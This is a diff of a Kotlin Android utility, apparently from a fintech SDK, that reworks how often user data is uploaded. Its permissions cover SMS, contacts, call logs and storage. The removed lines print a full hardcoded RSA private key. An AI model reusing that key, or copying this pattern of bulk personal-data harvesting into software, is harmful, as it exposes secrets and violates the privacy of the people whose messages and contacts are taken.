@@ -1,6 +1,7 @@
 package com.fintek.utils_androidx.upload
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.os.Build
 import androidx.annotation.RequiresApi
 import androidx.annotation.RequiresPermission
@@ -8,16 +9,11 @@ import com.fintek.utils_androidx.FintekUtils
 import com.fintek.utils_androidx.UtilsBridge
 import com.fintek.utils_androidx.encrypt.RSA
 import com.fintek.utils_androidx.encrypt.RSAUtil
-import com.fintek.utils_androidx.log.TimberUtil
 import com.fintek.utils_androidx.network.*
 import com.fintek.utils_androidx.sharedPreference.SharedPreferenceUtils
 import com.fintek.utils_androidx.thread.SimpleTask
 import com.fintek.utils_androidx.thread.Task
 import com.fintek.utils_androidx.upload.internal.*
-import com.fintek.utils_androidx.upload.internal.ExistedStringElement
-import com.fintek.utils_androidx.upload.internal.IS_EXISTED
-import com.fintek.utils_androidx.upload.internal.StringElement
-import com.fintek.utils_androidx.upload.internal.elementDelete
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import java.util.*
@@ -25,7 +21,23 @@ import java.util.concurrent.TimeUnit
 
 
 object UploadUtils {
+    private const val TAG = "UploadUtils"
+
+    private const val RSA_UPLOAD_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDD04SDnhHVYY9f2W3cXNia3b5b" +
+            "KlxthNAX1BoSIPdf4oUaSqdabfdSTgNdhppltA9ddpNN86mb3vk3FXvxn896E5mz" +
+            "b7WU4OU8LHlt0H4OpQRfMTS+O0vS9biJ2JSWzkKp2k4ehjOmvAtNZDVwjVgYXEcZ" +
+            "gzZAL1vvg72Afy58OwIDAQAB"
+
+    // save month upload count key
+    private const val MONTH_UPLOAD_RECORD = "month_upload_count"
+
+    private const val UPLOAD_COUNT = "upload_count"
+
+    private const val MEDIA_TYPE = "application/json; charset=utf-8"
+
     private val gson = Gson()
+    private val uploadCount: Int get() = SharedPreferenceUtils.getInt(UPLOAD_COUNT)
+    private var monthlyRecord: MonthlyRecord? by MonthDelegate(MONTH_UPLOAD_RECORD)
 
     private val coronetRequest: CoronetRequest = CoronetRequest.Builder()
         .setBaseUrl(FintekUtils.requiredBaseUrl)
@@ -51,31 +63,7 @@ object UploadUtils {
     ])
     @RequiresApi(Build.VERSION_CODES.KITKAT)
     fun upload() {
-        val monthCount = SharedPreferenceUtils.getInt(MONTH_UPLOAD_COUNT)
-        if (monthCount >= 1) {
-            // every month only upload once
-            return
-        }
-        if (IS_EXISTED || IS_UPLOADING) {
-            internalUpload()
-        }
-
-        // delete all cache file, start a new upload
-        elementDelete()
-        // create new struct json
-        UtilsBridge.executeByCPU(createNewStructJson(consumer { json ->
-            val element: Element<String> = StringElement(json)
-            val header = element.header() as Header
-
-            val task: RequestTask<UnitResponse> = Builder<UnitResponse>()
-                .build(UnitResponse.typeToken, header.part, header.total)
-                .onNext(consumer {
-                    elementUpload(element)
-                }).onError(consumer {
-
-                })
-            task.execute(Dispatchers.CPU)
-        }))
+        upload(false)
     }
 
     @RequiresPermission(anyOf = [
@@ -108,6 +96,30 @@ object UploadUtils {
         }
     }
 
+    @SuppressLint("MissingPermission", "NewApi")
+    internal fun monthlyUpload() {
+        val record: MonthlyRecord? = monthlyRecord
+        val calendar = Calendar.getInstance()
+        val isSameMonth: Boolean = record != null && record.year == calendar.get(Calendar.YEAR)
+                && record.month == calendar.get(Calendar.MONTH)
+        val isUploaded: Boolean = record != null && record.isUploaded
+
+        UtilsBridge.e(
+            TAG,
+            "preview: $record",
+            "now: (year: ${calendar.get(Calendar.YEAR)}, month: ${calendar.get(Calendar.MONTH)})",
+            "notice: month in [0, 11]"
+        )
+        if (isSameMonth && isUploaded) {
+            // every month only upload once
+            UtilsBridge.e(TAG, "every month only upload once, uploaded this month")
+            return
+        }
+
+        // If not uploaded this month, then upload
+        upload(true)
+    }
+
     @RequiresPermission(anyOf = [
         Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
         Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
@@ -116,23 +128,45 @@ object UploadUtils {
         Manifest.permission.INTERNET
     ])
     @RequiresApi(Build.VERSION_CODES.KITKAT)
-    internal fun monthlyUpload() {
-        val monthCount = SharedPreferenceUtils.getInt(MONTH_UPLOAD_COUNT)
-        if (monthCount >= 1) {
-            return
+    private fun upload(isMonthly: Boolean) {
+        UtilsBridge.e(TAG, "upload isMonthly: $isMonthly")
+        if (IS_EXISTED || IS_UPLOADING) {
+            internalUpload()
         }
 
-        upload()
-    }
+        // delete all cache file, start a new upload
+        elementDelete()
+        // create new struct json
+        UtilsBridge.executeByCPU(createNewStructJson(consumer { json ->
+            val element: Element<String> = StringElement(json)
+            element.isMonthly = isMonthly
+            val header = element.header() as Header
 
+            val task: RequestTask<UnitResponse> = Builder<UnitResponse>()
+                .build(UnitResponse.typeToken, header.part, header.total)
+                .onNext(consumer {
+                    elementUpload(element)
+                }).onError(consumer {
+
+                })
+            task.execute(Dispatchers.CPU)
+        }))
+    }
 
     @RequiresApi(Build.VERSION_CODES.KITKAT)
     private fun elementUpload(element: Element<String>) {
         if (!element.hasNext()) {
-            TimberUtil.e("Element is Empty: (isExisted-${!IS_EXISTED}, isUploading-${!IS_UPLOADING})")
-            val monthCount = SharedPreferenceUtils.getInt(MONTH_UPLOAD_COUNT)
+            UtilsBridge.e(TAG, "Element is Empty: (isExisted-${IS_EXISTED}, isUploading-${IS_UPLOADING})")
+            if (element.isMonthly) {
+                val calendar = Calendar.getInstance()
+                monthlyRecord = MonthlyRecord(
+                    calendar.get(Calendar.YEAR),
+                    calendar.get(Calendar.MONTH),
+                    true
+                )
+            }
             SharedPreferenceUtils.apply {
-                putInt(MONTH_UPLOAD_COUNT, monthCount)
+                putInt(UPLOAD_COUNT, uploadCount + 1)
             }
             return
         }
@@ -182,7 +216,7 @@ object UploadUtils {
 
     private val contentVersion: String get() {
         val calendar = Calendar.getInstance()
-        return "${calendar.get(Calendar.YEAR)}${calendar.get(Calendar.MONTH) + 1}"
+        return "${calendar.get(Calendar.YEAR)}${calendar.get(Calendar.MONTH) + 1}-$uploadCount"
     }
 
     private fun <T> consumer(block: (t: T) -> Unit) = object : FintekUtils.Consumer<T> {
@@ -191,24 +225,18 @@ object UploadUtils {
         }
     }
 
-    private const val RSA_UPLOAD_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDD04SDnhHVYY9f2W3cXNia3b5b" +
-            "KlxthNAX1BoSIPdf4oUaSqdabfdSTgNdhppltA9ddpNN86mb3vk3FXvxn896E5mz" +
-            "b7WU4OU8LHlt0H4OpQRfMTS+O0vS9biJ2JSWzkKp2k4ehjOmvAtNZDVwjVgYXEcZ" +
-            "gzZAL1vvg72Afy58OwIDAQAB"
-
-    const val PRIVATE = "MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAMPThIOeEdVhj1/Zbdxc2JrdvlsqXG2E0BfUGhIg91/ihRpKp1pt91JOA12GmmW0D112k03zqZve+TcVe/Gfz3oTmbNvtZTg5TwseW3Qfg6lBF8xNL47S9L1uInYlJbOQqnaTh6GM6a8C01kNXCNWBhcRxmDNkAvW++DvYB/Lnw7AgMBAAECgYAZAPj6lURRqpNT+b89U92UaJvVqCMFGOA5KqvphKwRYir8oGud8EyUBcIIPxeXxNXxaSKF4YbWkDHiBqw8vdsP0hjMmyIkc9p5/S4suJcKXpcGyaS4hfYYTDOQOXOg4i6HpaJnLeJ+Lmh40IM/dVijPPkBtA858Owzb4F/497tgQJBAOiRoWn026SotfgCDGiWAvVRCOI67WPyqALgdtaKU7eDpSbNIysLIRS8I4NcfUgeN5gzmlrfr7M7F2b3gsINJUcCQQDXjjqHgRp1ie29wvKTWvvZwODP2PQ/KUBqZ5oyYZA/4XiU2S+41+CrgtPxnEFTLGY5LXrXi31j9KhGOoG8L/ttAkAkV4VyqjmcXGS7EY7g1Pg3X2dU+sJXyPZqJKtNUSZN2ft3ubySIFYWCGRARbaqC1bCqOWo56VsC4LXqzu6mRVHAkB3EUiBWy4raQIbBRmLjgF6OhG0ngnk7bt4SzwgwkW1E63QwtuahhzDgKPkXUS0Vd0tjlLBx3p/AUEGcgEB25tNAkEAhJARb3Y1xzBKfYLNYILY1i286KfXCOv1P8ojYT5I2jc04N3ouW3G97ZaB8WL2ZIFNpR07dcLFWIwlySn1ZcvcA=="
-
-    // save month upload count key
-    private const val MONTH_UPLOAD_COUNT = "month_upload_count"
-
-    private const val MEDIA_TYPE = "application/json; charset=utf-8"
-
     private data class UploadReq(
         val userId: String = FintekUtils.requiredIdentify.toString(),
         val version: String = contentVersion,
         val content: String? = null,
         val part: Int,
         val total: Int
+    )
+
+    internal data class MonthlyRecord(
+        val year: Int,
+        val month: Int,
+        val isUploaded: Boolean
     )
 
     private data class UnitResponse(
